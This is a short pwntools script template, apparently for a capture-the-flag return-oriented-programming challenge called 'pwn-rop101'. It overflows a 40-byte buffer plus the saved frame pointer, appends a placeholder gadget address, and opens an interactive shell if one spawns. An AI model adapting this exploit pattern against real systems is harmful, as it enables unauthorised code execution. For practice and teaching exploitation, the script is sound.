from pwn import *

# context setup
context.binary = './pwn-rop101'
context.arch = 'amd64'
context.os = 'linux'

# for local exploit
p = process('./pwn-rop101')

# for remote exploit (if given)
# p = remote('target-ip', port)

# find offset to return address
offset = 40 + 8  # 40 buffer + 8 saved RBP

# example gadget address (replace with actual)
pop_rdi_ret = 0x0000000000400123  

# example payload
payload  = b"A" * offset
payload += p64(pop_rdi_ret)
# add more gadgets or system call addresses here if needed

# send payload
p.sendlineafter('=ROP101=\n', payload)

# interact with shell (if spawned)
p.interactive()
